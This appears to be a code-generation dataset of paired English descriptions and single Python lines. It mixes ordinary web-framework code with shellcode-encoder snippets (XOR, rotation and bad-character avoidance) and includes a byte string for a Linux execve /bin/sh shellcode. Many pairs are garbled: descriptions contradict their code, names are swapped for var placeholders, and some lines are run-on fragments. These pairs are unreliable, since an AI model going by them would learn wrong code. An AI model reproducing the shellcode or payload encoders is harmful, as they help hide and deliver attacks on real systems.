+substitute __setitem__ filed of the base class of the class SortedDict for super_set. </s> super_set = super ( SortedDict , self ) . __setitem__
+supports_microseconds is boolean False. </s> supports_microseconds = False
+separate every 2 characters of the string swapped with the separator ", " </s> swapped = ', ' . join ( swapped [ i : i + 2 ] for i in range ( 0 , len ( swapped ) , 2 ) )
+add "0x" to every 2 characters of the string swapped </s> swapped = '0x' . join ( swapped [ i : i + 2 ] for i in range ( 0 , len ( swapped ) , 2 ) )
+convert the values of swapped to hexadecimals </s> swapped = binascii . hexlify ( bytearray ( swapped ) )
+open out_log file in append mode with buffering size of the input buffer, substitute the result for sys.stdout. </s> sys . stdout = open ( out_log , 'a' , buffering )
+exit the program with code 0 </s> sys . exit ( 0 )
+decrement t by integer 1, </s> t -= 1
+call the method self.non_field_errors, substitute the result for top_errors. </s> top_errors = self . non_field_errors ( )
+integer 0 and integer 0.   try, </s> try :
+append to the string val the value (7 - (256 -x)) converted to hexadecimal </s> val += '%02x' % ( 7 - ( 256 - x ) )
+convert (x+7) to hexadecimal and append it to the string val </s> val += '%02x' % ( x + 7 )
+for each element in var convert the element to an integer representing the unicode then convert it to a hexadecimal ignore slice at index 2 until the end and join separating each element by the string '\\x' </s> val = '' . join ( '\\x{}' . format ( hex ( ord ( x ) ) [ 2 : ] ) for x in var )
+subtract 1 from 2 to the power of max_bits and assign the result to val1 </s> val1 = 2 ** max_bits - 1
+call the function func with the argument tmp and save the return value in val1 </s> val1 = func ( tmp )
+assign val1 the hexadecimal value of the variable byte converted to int16  xor with the variable i </s> val1 = int ( byte . encode ( 'hex' ) , 16 ) ^ i
+call the method self.var1.resolve with 2 arguments: context and boolean True, substitute the result for val2. </s> val1 = self . var1 . resolve ( context , True )
+val2 is the result of the bitwise xor between the integer base 32 of the element i of chunk encoded to hex and xor_byte </s> val2 = int ( chunk [ i ] . encode ( 'hex' ) , 32 ) ^ xor_byte
+call the method parser.compile_filter with an argument, third element of bits, substitute the result for val2. </s> val2 = parser . compile_filter ( bits [ 2 ] )
+add the string value '\\x' to the variable var </s> var += '\\x'
+Convert the variable rand to a hexadecimal and add it to the variable var </s> var += '\\x%02x' % rand
+append '0x' to var </s> var += '0x'
+add the bytes literal "\x0a\x1b\x2c\x3d\x4e\x5f\x6a\x10\x56\x57\x68\x99\xa5" to the variable var </s> var += b'\x0a\x1b\x2c\x3d\x4e\x5f\x6a\x10\x56\x57\x68\x99\xa5'
+add the bytes literal "\x5b\x37\x42\x01\xbd\x3c\x72\x7c\x02\x3d\x5f\xc1\xcf" to the variable var </s> var += b'\x5b\x37\x42\x01\xbd\x3c\x72\x7c\x02\x3d\x5f\xc1\xcf'
+add the bytes literal "\x90\x4a\x5c\xf3\x1e\x81\x69\x14\x75\x72\xde\xac\x77" to the variable var </s> var += b'\x90\x4a\x5c\xf3\x1e\x81\x69\x14\x75\x72\xde\xac\x77'
+add the bytes literal "\x99\xaf\xbb\xed\xbe\x46\x56\x4e\x88\x72\x53\x44\x68" to the variable var </s> var += b'\x99\xaf\xbb\xed\xbe\x46\x56\x4e\x88\x72\x53\x44\x68'
+add the bytes literal "\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c" to the variable var </s> var += b'\xae\xf2\xc4\xbb\x03\x41\xcd\x8b\x52\x10\x8b\x4a\x3c'
+Convert the value of val1 to hexadecimal, then slice it between the indicies 2 and 3, convert it to an int16 and add its value to var1 </s> var1 = int ( hex ( val1 ) [ 2 : 3 ] , 16 )
+visible_issue_count is an integer 0. </s> visible_issue_count = 0
+endless loop, </s> while True : 
+while x is greater than zero, </s> while x > 0 : 
+subtract decimals from digits, substitute the result for whole_digits. </s> whole_digits = digits - decimals
+open writer.path file in write mode, with file descriptor as fh, perform the following, </s> with open ( writer . path , 'wb' ) as fh : 
+append to the string x the hexadecimal conversion of the and operation between a and 0xff </s> x += '%02x' % ( a & 0xff )
+append to the string encoded the hexadecimal conversion of the and operation between y and 0xff </s> x += '%02x' % ( a & 0xff )
+perform the and operation between y and 0xff, then convert the result in hexadecimal and append it to the string x </s> x += '%02x' % ( y & 0xff )
+add 1 to x </s> x += 1
+Convert the value of y to hexadecimal, then slice it at index 3 and add its value to x </s> x += hex ( y ) [ 3 : ]
+Slice y at index 3 and add its value to x </s> x += y [ 3 : ]
+Convert the value of y to hexadecimal, then slice it at index 3 and add the value to x </s> x += y [ 3 : ]
+Convert the variable x to a hexadecimal and store it in the variable x </s> x = '%02x' % x
+initialize an empty string variable called x </s> x = ''
+store the variable x the value of the function rol with x and rand as parameters </s> x = rol ( x , rand )
+perform a left shift on x by n, then store the result in x </s> x = x << nbits
+in x replace '\x45' with bytes object containing the value y packed according to the format string unsigned char </s> x = x . replace ( '\x45' , struct . pack ( 'B' , y ) )
+assign the variable x the value of x xor 0xDD </s> x = x ^ 0xDD
+assign xor_byte the value of the function find_valid_xor_byte with chunk and bad_chars as parameters </s> xor_byte = find_valid_xor_byte ( chunk , bad_chars )
+Take the absolute value of subfs then convert subfs to an integer, then cast to a hexadecimal, slice the variable rev_suplx between the indicies 0 and 2 then cast rev_suplx to the type int32, store the value of the summation in the variable xxx </s> xxx = hex ( int ( abs ( subfs ) ) + int ( rev_suplx [ 0 : 2 ] , 32 ) )
+Convert the variable x to a hexadecimal and store it in the variable y </s> y += '%02x' % x
+append the value x converted in hex to the string y </s> y += '%02x' % x
+assign the variable y the bytearray of the variable shellcode at index 0 bitwise xor bytearray of shellcode at index 1 </s> y = bytearray ( shellcode ) [ 0 ] ^ bytearray ( shellcode ) [ 1 ]
+assign the variable y to x bitwise xor the bytearray of shellcode at index n </s> y = x ^ bytearray ( shellcode ) [ n ]
+Convert the variable x to a hexadecimal and add it to the variable z followed by ',' </s> z += '%02x, ' % x
+append the value y converted to hex to the string z </s> z += '%02x' % y
+zbuf is an instance of BytesIO class. </s> zbuf = BytesIO ( )
+convert to hexadecimal a random integer between 1 and 100 and append it to the string a </s> a += '\\x%02x' % random . randint ( 1 , 100 )
+append string '0x' to a </s> a += var0
+increment a by 1 </s> a += 1
+cast a to int16 </s> a = int ( hopcode , 16 )
+ba1 is a bytearrary of ba1 </s> var0 = bytearray ( var0 )
+call the import_string with argument backend, substitute it for backend_cls. </s> var2 = var0 ( var1 )
+bad_app_labels is an empty set. </s> bad_app_labels = set ( )
+break loop execution. </s> break
+break from the loop execution. </s> break
+breaks from the smallest enclosing loop. </s> break
+skip this loop iteration. </s> break
+break from the loop execution </s> break
+read one line from self file stream, substitute the result for buf. </s> var0 = self . readline ( )
+buf is an instance of StreamingBuffer class. </s> var0 = var1 ( )
+substitute line for buffer_. </s> var0 = line
+builtins is an dictionary with 3 initial entries: boolean True for 'True', boolean False for 'False' and None for 'None'. </s> var0 = { var1 : True , 'False' : False , 'None' : None }
+call te method operator.itemgetter with an argument integer 0, substitute the result for byte2int. </s> var1 = var0 ( 0 )
+convert bytes to floating point number, substitute it for bytes. </s> bytes = float ( bytes )
+c is the sum of a and b modulo 100 </s> c = ( a + b ) % 100
+call the self._read_limiter with length of self.buffer subtracted from size as argument, store the result into chunk. </s> chunk = self . _read_limited ( size - len ( var1 ) )
+call the method stream.read with an argument max_header_size, substitute the result for chunk. </s> chunk = var0 ( var1 )
+substitute length of chunk for chunk_length. </s> var0 = len ( chunk )
+double the chunk size. </s> chunk_size *= 2
+call the function get_quantifier with 2 arguments: ch and pattern_iter, substitute the result for count and ch, respectively. </s> count , var1 = var0 ( var1 , var3 )
+call the itertools.count function with argument integer 1, substitute the result for count. </s> count = var0 ( 1 )
+multiply seconds by count, subtract it from since, divide the result by seconds2, store the floored result in count2. </s> var2 = ( var0 - seconds * count ) // var1
+define a variable named counter and assign 0 to it </s> counter = 0
+add the string value '0x' to the variable d </s> d += var0
+append e to debugs list for every e in all_issues, if e.level is lesser than checks.INFO and result of the method e.is_silenced in false. </s> debugs = [ e for e in var0 if var2 < checks . var4 and not e . var6 ( ) ]
+substitute first decimal_pos elements of dec_part for dec_part. </s> var1 = var1 [ : var0 ]
+update declared_fields dictionary with entry base.declared_fields. </s> var0 . update ( base . var0 )
+declared_fields is an instance of OrderedDict class. </s> var0 = var1 ( )
+call the function curry with 2 arguments: _proxy_method and method set to bytes.decode, substitute the result for decode. </s> decode = curry ( var0 , method = var1 )
+s and max_age set to max_age, use it as an argument for the force_bytes function, substitute the result for base64d.   decompress is boolean False. </s> decompress = var8
+called with with an argument lambda function which returns result of the force_text function called with an argument text.   define the method add_truncation_text with 3 arguments: self, text and truncate set to None. </s> def var4 ( self , text , truncate = var6 ) : 
+define a method named add with the parameters a, b and c. C has a default value of 3 </s> def add ( a , b , c = 3 ) : 
+define the function find_template_loader with an argument loader. </s> def var0 ( loader ) : 
+define the function first with an argument value. </s> def first ( value ) : 
+define a method named func with the parameters n,x, and y. Y has a default value of 1 </s> def var0 ( n , x , y = 1 ) : 
+define the function mark_safe with an argument s. </s> def var0 ( s ) : 
+define the function media with an argument request. </s> def media ( request ) : 
+define the function rmtree_errorhandler with 3 arguments func, path and exc_info. </s> def var1 ( var0 , path , var2 ) : 
+define the method root_attributes with an argument self. </s> def var0 ( self ) : 
+define a method named routine that takes in n as a parameter </s> def routine ( n ) : 
+define the method rss_attributes with an argument self. </s> def var0 ( self ) : 
+else if name is equal to the string 'abcd' </s> elif name == var0:
+otherwise if fourth element of version does not equals to 'final', </s> elif version [3]!= var0:
+if not, </s> else:
+to the function timedelta called with an argument seconds as negative time.altzone, return the result.   if not, </s> else:
+elt is an list with an element elt. </s> var0 = [ var0 ]
+EMPTY_VALUES is a tuple containing 5 initial elements: None, empty string, empty list, empty tuple and an empty dictionary. </s> EMPTY_VALUES = var0 , '' , [ ] , ( ) , { }
+put elements of validators.EMPTY_VALUES to a list, substitute the result for empty_values. </s> var2 = list ( var0 . var1 )
+call the function curry with 2 arguments: _proxy_method and method set to six.text_type.encode, substitute the result for encode. </s> encode = curry ( var0 , method = six . var2 . encode )
+encode is an lambda function with arguments k and v, return value is string '%s=%s', where '%s' is replaced with: </s> encode = lambda k , v : var0 % ( quote ( k , safe ) , quote ( v , safe ) )
+add the string value ',' to the variable encoded </s> encoded += ', '
+add the string value '\\y' to the variable encoded </s> encoded += '\\y'
+Convert the value of j to a hexadecimal then add it to the variable encoded followed by the string ', ' </s> encoded += '%02x, ' % j
+Convert the value of y bitwise and 0xff to a hexadecimal then add it to the variable encoded followed by the string ',' </s> encoded += '%02x, ' % ( y & var1 )
+Convert the value of x to a hexadecimal then add it to the variable encoded followed by the string ', ' </s> encoded += '%02x, ' % x
+Convert the variable x to a hexadecimal. Concatenate the result with the string ',' add the result to the variable encoded </s> encoded += '%02x, ' % x
+convert the value x to hex, concatenate the result with ',' and append it to the string encoded </s> encoded += '%02x, ' % x
+convert (7 -(256 - x)) to hexadecimal, concatenate the result with the string ',' and append it to the string encoded </s> encoded += '%02x, ' % ( 7 - ( 256 - x ) )
+Convert the value of h bitwise and 0xff to a hexadecimal, concatenate the result with the string ',' and then add it to the variable encoded </s> encoded += '%02x, ' % ( h & var1 )
+convert (x+7) to hexadecimal, concatenate the result with the string ',' and append it to the string encoded </s> encoded += '%02x, ' % ( x + 7 )
+Convert the value of y to a hexadecimal, concatenate the result with the string ',' and then add it to the variable encoded </s> encoded += '%02x, ' % y
+convert the value x to hex and append it to the string encoded </s> encoded += '%02x' % x
+concatenate the string '0x' with the hexadecimal conversion of 0xAA and append the result to the string encoded </s> encoded += '0x%02x, ' % var1
+concatenate the string '0x' with the hexadecimal conversion of rand and append the result to the string encoded </s> encoded += '0x%02x, ' % rand
+set encoded to the string '0x' </s> encoded = var0
+encoded is the concatenation of the string "0x" with the hexadecimal conversion of the lenght of the array of bytes of shellcode </s> encoded = '0x%02x, ' % len ( bytearray ( var2 ) )
+convert the value z to hex and append it to the string encoded1 </s> var0 += '%02x' % z
+Convert the value of leader to hexadecimal, then slice it at the index of 2 and add its value to the variable encoded3 </s> var0 += hex ( leader ) [ 2 : ]
+call the method Encoders.encode_base64 with an argument attachment. </s> var0 . var2 ( attachment )
+substitute string 'ascii' for encoding. </s> encoding = var0
+if encoding does not exists substitute it for settings.DEFAULT_CHARSET. </s> encoding = encoding or settings . var0
+substitute elements of tuple boundary to end and next, respectively. </s> end , next = boundary
+es is a bytearrary of the byte string "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x87\xe3\xb0\x0b\xcd\x80" </s> es = bytearray ( b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x87\xe3\xb0\x0b\xcd\x80' )
+if ZeroDivisionError exception is caught, </s> except var0:
+if zlib.error as e exception is raised, </s> except var0 as e:
+except </s> except:
+executor is an instance of the class MigrationExecutor created with an argument: value under the DEFAULT_DB_ALIAS key of the connections dictionary. </s> executor = var0 ( connections [ var1 ] )
+substitute them for app_label and migration_name, respectively.   executor is an instance of MigrationExecutor, created with value under the DEFAULT_DB_ALIAS key of the connections dictionary. </s> executor = var6 ( connections [ var7 ] )
+call the function exhaust with an argument field_stream. </s> exhaust ( var0 )
+call the function exhaust with an argument self._input_data. </s> exhaust ( var0 )
+call the function os.spawnve with os.P_WAIT, sys.executable, args and new_environ as arguments, substitute the result for exit_code. </s> var6 = var0 ( os . var1 , var2 , var3 , var4 )
+call the function restart_with_reloader, substitute the return value for exit_code. </s> var1 = var0 ( )
+terminate the program with exit code 4 </s> exit ( 4 )
+terminate the program with exit code 5 </s> exit ( 5 )
+on the object under the db key of connections dictionary call the method ops.value_to_db_datetime with argument exp, substitute the result for the exp. </s> var2 = connections [ db ] . ops . var1 ( var2 )
+call the function datetime.fromtimestamp with argument timeout, substitute it for exp. </s> var2 = var0 ( var1 )
+call the method test_runner.run_tests with an argument test_labels, substitute it for failures. </s> failures = var0 . var2 ( var3 )
+FASTCGI_OPTIONS is a dictionary containing 16 initial entries: 'fcgi' for 'protocol', None for 'host', None for 'port', </s> FASTCGI_OPTIONS = { 'protocol' : var0 , 'host' : var2 , 'port' : var2 , 'socket' : var2 , 'method' : 'fork' , 'daemonize' : var2 , 'workdir' : '/' , 'pidfile' : var2 , 'maxspare' : 5 , 'minspare' : 2 , 'maxchildren' : 50 , 'maxrequests' : 0 , 'debug' : var2 , 'outlog' : var2 , 'errlog' : var2 , 'umask' : var2 }
+dir set to None as the arguments.   call the method tmpfile.mkstemp with suffix set to suffix, prefix set to prefix and dir set to dir, store the result in the fd and name, respective. </s> var6 , name = tempfile . mkstemp ( suffix = suffix , prefix = prefix , var0 = var0 )
+join base an unpacked list paths into a string, get the absolute path in unicode representation of the result, substitute the result for final_path. </s> var1 = abspathu ( join ( base , * paths ) )
+finally perform, </s> finally:
+call the method smart_split_re.finditer with an argument text, for every bit in result, </s> for bit in var0 . finditer ( text ) : 
+split tag_re by self.template_string separator, for every bit in result, </s> for bit in var0 . split ( self . var2 ) : 
+iterate over bytes in array </s> for byte in array : 
+iterate bytes in list lst </s> for byte in var0 : 
+iterate byte in the list lst1 </s> for byte in var0 : 
+iterate byte in lst2 </s> for byte in var0 : 
+iterate over bytes in lst3 </s> for byte in var0_
+for every bytes in stream, </s> for bytes in stream : 
+for every c in lineno_comment_map dictionary value under the comment_lineno_cache key, </s> for c in var0 [ var1 ] : 
+for every ch and escaped in input_iter, </s> for var0 , escaped in var1 : 
+for every ch in input_iter, </s> for var0 in var1 : 
+for every char in fmt, </s> for char in var0 : 
+iterate char over str </s> for char in var0 : 
+for every i and widget in enumerated iterable self.widgets, </s> for i , widget in enumerate ( var1 ) : 
+for every i and word in enumerated iterable words, </s> for i , word in enumerate ( words ) : 
+loop through sc3 converted into a bytearray </s> for i in var1 ( var0 ) : 
+Make a for loop for each i in the bytearray of sc4 </s> for i in var0 ( var1 ) : 
+declare a for loop with an iterator i for each element in sh starting from index 4 converted into a bytearray </s> for i in var2 ( var1 ) [ 4 : ] : 
+iterate i in lst </s> for i in var0 : 
+iterate i over 200 random numbers between 1 and 256 </s> for i in random . sample ( range ( 1 , 256 ) , 200 ) : 
+for every i in range of integers from integer 0 to the length of pieces decremented by one, with step of integer 3, </s> for i in range ( 0 , len ( pieces ) - 1 , 3 ) : 
+call the method self.total_form_count, for every i in sequence of integers, from 0 to the previous result, </s> for i in range ( 0 , self . var1 ( ) ) : 
+for every i in range of integers from 0 to length of result, not included, </s> for i in range ( len ( result ) ) : 
+iterate i over a sequence of number from 0 to 5 </s> for i in range ( 0 , 5 ) : 
+initialize a for loop with an iterator i with a range starting from 0 until the length of shellcode_original with a step of 8 </s> for i in range ( 0 , len ( var2 ) , 8 ) : 
+initialize a for loop with an iterator i with a range starting from 0 until the value of stop </s> for i in range ( 0 , stop ) : 
+loop over shellcode </s> for i in var0 : 
+zip elements of inner_result and inner_args into a list of tuples, for every i_item and i_args in the result, </s> for var4 , var6 in zip ( var0 , var1 ) : 
+for every index in range of integers from 0 to length of hextets, not included, </s> for index in range ( len ( var0 ) ) : 
+for every j in range of integers from 0 to iterations converted to an integer, </s> for j in xrange ( int ( iterations ) ) : 
+for every x in argset, </s> for x in var0 : 
+Make a for loop for each x in the bytearray of sh1 </s> for x in var0 ( var1 ) : 
+loop through sh2 converted into a bytearray </s> for x in var1 ( var0 ) : 
+loop x over the bytearray of the string sh3 </s> for x in var0 ( var1 ) : 
+for every x is the range of integers from level to the integer 2, in the reversed order, </s> for x in range ( level , 1 , - 1 ) : 
+substitute force_bytes for force_str. </s> var1 = var0
+get the value under the 'format' key of the options dictionary, substitute the result for format. </s> format = options . get ( var0 )
+append encoded_instruction_in_hex and string "," to the variable format_0x </s> var3 += var0 + ', '
+initialize format_0x to an empty string </s> var0 = ''
+format key is an empty string. </s> format_key = ''
+format_slash_x is an empty string "" </s> var0 = ''
+substitute second element of bits without the first and last element for format_string. </s> var1 = bits [ 1 ] [ 1 : - 1 ]
+call the function re.sub with 3 arguments: raw string "\\.|.", escape_quotes and tok without the first and last element, </s> guts = var0 ( '\\\\.|.' , var2 , var4 [ 1 : - 1 ] )
+h is the sum of y and x modulo 256 </s> h = ( y + x ) % 256
+substitute self.handle_app for handle_app. </s> var1 = self . var1
+call the function digest, substitute the filed digest_size of the result for hlen. </s> var1 = digest ( ) . var0
+if return value of the self.is_secure is false and server port is not equal to string '80',   join host and server_port into a string, separated with ':', substitute the result for host. </s> host = '%s:%s' % ( host , var4 )
+result of the function force_text called with an argument title, and with sublist, append the string to output.   increment i by 1. </s> i += 1
+increment i by 1 </s> i += 1
+add 1 to the variable i </s> i += 1
+i is integer 0. </s> i = 0
+substitute self.pointer for i. </s> i = var0
+initialize i as an integer </s> i = 0
+I18N_MODIFIED is integer 2 </s> var0 = 2
+if character '=' is contained in x, </s> if var0 in x : 
+if string "0x1," is in format_0x </s> if '0x1, ' in var1 : 
+if string 'help' is contained in options, </s> if var0 in options : 
+strings "Please submit %d or fewer forms.", "Please submit %d or fewer forms." and self.max_num,   where '%d' is replaced with self.max_num, and code as a string 'too_many_forms'.   if self.validate_min is true, and length of self.deleted_forms subtracted from the return value of the method self.total_form_count, </s> if ( self . var14 and self . var18 ( ) - len ( self . var16 ) < self . min_num ) : 
+check if the length of the variable a is not even </s> if ( len ( a ) % 2 ) != 0 : 
+check if the variable r xor shellcode_original at index i is not equal to 0 and r bitwise xor shellcode_original at index i+1 does not equal 0 and r bitwise xor shellcode_original at index i+2 does not equal 0 and r bitwise xor shellcode_original at index i+3 does not equal 0 </s> if ( r ^ var0 [ i ] != 0 ) and ( r ^ var0 [ i + 1 ] != 0 ) and ( r ^ var0 [ i + 2 ] != 0 ) and ( r ^ var0 [ i + 3 ] != 0 ) : 
+if response.status_code is lesser than integer 200 and grater or equal than 100, or response.status_code equals to integer 204 or 304, </s> if 100 <= response . var2 < 200 or response . var2 in ( 204 , 304 ) : 
+check if variable a is less than the value of 1 </s> if a < 1 : 
+if accept_lang equals '*', </s> if var0 == var2 : 
+if changes is true, </s> if changes : 
+if cookie is an empty string, </s> if cookie == '' : 
+if count does not equals to integer 0, </s> if count != 0 : 
+if count modulo 2 is not equal to zero </s> if count % 2 != 0 : 
+if count2 does not equals to integer 0, </s> if var0 != 0 : 
+if counter modulo 3 is equal to 0 </s> if counter % 3 == 0 : 
+if not csrf_token is None.   if csrf_token is true, </s> if var0 : 
+bring integer 36 to the power of factor, if i is smaller than the result, </s> if i < 36 ** factor : 
+if variable i is lower than the length of chunk </s> if i < len ( chunk ) : 
+if i equals to integer 0 and </s> if i == 0 and not is_writable ( npath ( base_path + '.mo' ) ) : 
+convert to integer base 16 the string shellcode encoded to hex and check if it is equal to i </s> if i == int ( var0 . encode ( 'hex' ) , 16 ) : 
+if length of x is equal to integer 0, </s> if len ( x ) == 0 : 
+if len_values is smaller than integer 1, </s> if var0 < 1 : 
+if the length of sys.argv is not equal to 3 </s> if len ( var0 ) != 3 : 
+if the number of  command-line arguments is lower than 10 </s> if len ( sys . argv ) < 10 : 
+Check if the length of x is greater than 4 </s> if len ( x ) > 4 : 
+if the length of z is not divisable by 4 </s> if len ( z ) % 4 != 0 : 
+if level is true, </s> if level : 
+check if matched_a_byte is True </s> if var0 : 
+if mtime is different than the value of dictionary _mtimes under the key filename, </s> if var0 != var2 [ filename ] : 
+if match is false or call to the method match.group with an argument integer 1 evaluates to boolean false, </s> if not match or not var0 ( 1 ) : 
+check if matched_a_byte is not True </s> if not var0 : 
+if p_pattern starts with a string '^', </s> if var0 . startswith ( '^' ) : 
+check if the variable padding does not equal 0 </s> if padding : 
+if role is contained in value under the NOCOLOR_PALETTE key of the PALETTES dictionary and definition is true, </s> if role in var1 [ var0 ] and definition : 
+if root is true, </s> if root : 
+call the method router.allow_migrate with 2 arguments: self.using and obj.object.__class__, if it evaluates to true, </s> if router . var1 ( var2 , var3 ) : 
+if fifth and sixth elements of row are None, </s> if row [ 4 ] is var0 or row [ 5 ] is var0 : 
+on the result call the method encode with the arguments encoding and errors, return the result.   if strings_only and boolean return value of the call to the function is_protected_type for argument s are boolean True, </s> if var1 and var3 ( s ) : 
+check if the bytes object containing my_value packed according to the format string unsigned char is equal to the variable z </s> if struct . pack ( 'B' , var0 ^ i ) == z : 
+if sub_match is true, </s> if var0 : 
+if total is not equivalent to 2 </s> if total != 2 : 
+if with_base_fields is true, </s> if var0 : 
+if words is not empty and length is smaller than or equal to integer 0, </s> if words and length <= 0 : 
+if x equals to integer 0, </s> if x == 0 : 
+check if x is equal to the element n in shellcode converted into a bytearray </s> if x == var1 ( var0 ) [ n ] : 
+check if xxx is greater or equals to 0 </s> if xxx >= 0 : 
+if y, m and d are all equal to string '0', </s> if y == m == d == var0 : 
+if z is equal to byte </s> if z == byte : 
+convert the string byte to hex, then cast the result to int16 and then check if it is equal to variable z </s> if z == int ( byte . encode ( 'hex' ) , 16 ) : 
+import module struc. </s> import var0t
+import module subprocess. </s> import var0
+import module sys. </s> import var0
+import module tarfile. </s> import var0
+import module tempfile. </s> import var0
+inputs is an empty list. </s> inputs = [ ]
+substitute complain for insert. </s> insert = complain
+generate a random integer between 1 and 2 then convert the random number into a hexadecimal and store the value in insertByte </s> var0 = hex ( random . randint ( 1 , 2 ) )
+and unpacked dictionary kwargs.   instance.keyOrder is an empty list. </s> instance . var3 = [ ]
+substitute _itervalues for itervalues. </s> var1 = var0
+compute the sum of i and magic modulus 256 and store in the variable j </s> j = ( i + magic ) % 256
+bring integer 36 to the power of factor, substitute the result for j. </s> j = 36 ** factor
+call the function escape with an argument lead, substitute the result for lead, call the function escape with an argument trail, </s> lead , trail = escape ( lead ) , escape ( trail )
+sum lead and opening, substitute the result for lead. </s> lead = lead + opening
+set leader to the second command-line argument after casting it to an int </s> leader = var0 ( sys . argv [ 2 ] )
+substitute length of values for len_values. </s> var0 = len ( values )
+print the length of array of bytes of the string var </s> len(bytearray(var)))
+substitute arg converted into a integer for length. </s> length = int ( var0 )
+store in the variable length_format_0x the number of "," occurences in format_0x </s> var0 = var2 . count ( ', ' )
+increment level by one. </s> level += 1
+Declare an empty bytes literal and store it in the variable lit </s> lit = b''
+m2m_value is an lambda function with value as an argument, return value is the result of the method value.natural_key. </s> var0 = lambda value : value . var2 ( )
+match is boolean True. </s> match = var0
+matches is boolean False. </s> matches = var0
+multiply delta.days with an integer 86400 add to the result delta.seconds, if the result is greater than integer 0, </s> max_age = max ( 0 , var0 * 86400 + var1 )
+intialize the variable max_bits to an integer with the value of 8 </s> var1 = 8
+call the mw_class function, store the result in the mw_instance. </s> var1 = var0 ( )
+n is equal to n bitwise and masked width </s> n &= mask ( width )
+Convert the value of y to a hexadecimal then add it to the variable n </s> n += '%02x' % y
+increase n by 1 </s> n += 1
+get the attribute '__name__' from the getattr, if it exists substitute it for m, if not, m is None. </s> n = var1 ( lookup_view , var0 , var2 )
+convert idx to an integer, substitute it or n. </s> n = int ( var0 )
+initialize an empty string variable called name </s> name = ''
+in the variable encoded replace all occurrences of "\\x" with ",0x" </s> nasm = encoded . replace ( '\\x' , ',var2' )
+set the variable nasm to all the elements in the variable nasm starting from index 1 until the end </s> var0 = var0 [ 1 : ]
+call the value.natural_key method, substitute the result for natural. </s> natural = value . var1 ( )
+call the method obj.natural_key, substitute the result for natural_key. </s> var1 = obj . var1 ( )
+set the variable nbits to the second command-line argument converted to integer </s> var0 = int ( sys . argv [ 2 ] )
+append orig_file to string '#: ', substitute it for new. </s> new = var2 + var0
+set the variable new to not i bitwise and 0xff </s> new = ~ i & var1
+set new to new xor the variable xor </s> new = new ^ xor
+set new to new shifted left by shift </s> new = new << shift
+ORDERING_FIELD_NAME is a string 'ORDER'. </s> var0 = var1
+set orig to an empty list </s> var0 = [ ]
+call the method cls.__dict__.copy substitute the result for orig_vars. </s> var1 = var0 ( )
+append i to the variable orig </s> var0 . append ( i )
+join tmpdir and sting 'original' into a file path name, substitute it for original_path. </s> var2 = os . path . join ( var0 , var1 )
+convert the value x to a hexadecimal and append it to the string original_shellcode followed by the string ',' </s> var0 += '%02x, ' % x
+close the process with an argument 0. </s> os . _exit ( 0 )
+exit the program with the code integer 1. </s> os . _exit ( 1 )
+feed data to the parser p. </s> var0feed ( data )
+P is a string '\03335m' </s> P = '\x1b35m'
+calculate negative length of s, by modulus integer 4, use the result as the number of '=' characters to be stored in pad. </s> pad = bvar0 * ( - len ( s ) % 4 )
+assign the variable padding 4 minus the length of shellcode_original modulus 4 </s> padding = 4 - len ( var0 ) % 4
+remove 3 elements from r starting at the index 23. </s> r = r [ : 23 ] + r [ 26 : ]
+set the variable r to a random integer between 10 and 255 </s> r = random . randint ( 10 , 255 )
+raise an exception. </s> raise
+RAISE_ERROR is an instance of object class. </s> var0 = object ( )
+random is an instance of random.SystemRandom class. </s> random = random . var0 ( )
+assign the first two elements of op to res </s> res = var0 [ 0 : 2 ]
+increment res by element of to_digit at the digit index. </s> res = var0s [ digit ] + res
+res is x xor y </s> res = x ^ y
+right shift by val2 the and operation between z and val1 and assign it to res1 </s> var2 = ( z & var1 ) >> var0
+perform the and operation between x shifted right by val2 and val1 and assign the result to res1 </s> var2 = x >> var0 & var1
+assign the variable res2 variable x bitwise and val1 </s> var0 = x & var2
+assign res2 the value of res2 left shift by max_bits minus val2 </s> var0 = var0 >> var2 - var3
+left shift x by max_bits plus val2 and assign the result to res2 </s> var2 = x << var0 + var1
+result is the concatenation of the string "\\x", the hexadecimal value of the length of array of bytes of the variable sc and the string ',' </s> result = '\\x%02x, ' % len ( bytearray ( sc ) )
+return a tuple with 3 elements: TYPE, outdict and stream. </s> return var0 , var1 , stream
+return the result of bitwise left shift of n and temp bitwise and mask_value bitwise or with the bitwise right shift of n by the subtraction of temp from width </s> return n << temp & var4 | n >> width - temp
+return the result of bitwise right shift of n and rotations xor the bitwise left shift of n and subtract rotations from width bitwise and mask_value </s> return n >> rotations ^ n << width - rotations & var3
+return n right shift by rotations bitwise or with the result of n left shift by width bitwise and mask_value </s> return [ Warning ( 'BooleanField does not have a default value.' , hint = 'Django 1.6 changed the default value of BooleanField from False to None.See https://docs.djangoproject.com/en/1.6/ref/models/fields/#booleanfield for more information.' , obj = field , id = '1_6.W002' ) for field in problem_fields ]
+return 2 to the power of n minus 1 </s> return 2 ** n - 1
+return i. </s> return i
+if filename ends with string '.mo' return I18N_MODIFIED, otherwise return FILE_MODIFIED. </s> return var1 if filename . endswith ( var0 ) else var3
+return msgs. </s> return msgs
+return name. </s> return name
+call the method self.expression, substitute the result for retval. </s> var1 = var0 ( )
+substitute element at self.pos index of self.tokens for retval. </s> var1 = var0 [ self . pos ]
+store in rev_suplx the reverse of the array suplX </s> var0 = var1 [ : : - 1 ]
+substitute complain for reverse. </s> reverse = complain
+and lambda function with 2 arguments: self and other, resulting boolean False if self is lesser than other or self is equal to other,   tuple with 2 elements: string '__le__',   and lambda function with 2 arguments: self and other, resulting boolean True if self is lesser than other or self is equal to other,   tuple with 2 elements: string '__ge__',   and lambda function with 2 arguments: self and other, resulting boolean False if self is lesser than other, for '__lt__',   list with 3 tuples: tuple with 2 elements: string '__ge__',   and lambda function with 2 arguments: self and other, resulting boolean False if self is lesser than or equal to other,   or self is equal to other, tuple with 2 elements: string '__lt__',   and lambda function with 2 arguments: self and other, resulting boolean True if self is lesser than or equal to other,   or self is not equal to other, tuple with 2 elements: string '__gt__',   and lambda function with 2 arguments: self and other, resulting boolean False if self is lesser than or equal to other, for '__le__',   list with 3 tuples: tuple with 2 elements: string '__lt__',   and lambda function with 2 arguments: self and other, resulting boolean False if self is greater than other or self is equal to other,   tuple with 2 elements: string '__ge__',   and lambda function with 2 arguments: self and other, resulting boolean True if self is greater than other or self is equal to other,   tuple with 2 elements: string '__le__',   and lambda function with 2 arguments: self and other, resulting boolean False if self is greater than other, for '__gt__',   and list with 3 tuples: tuple with 2 elements: 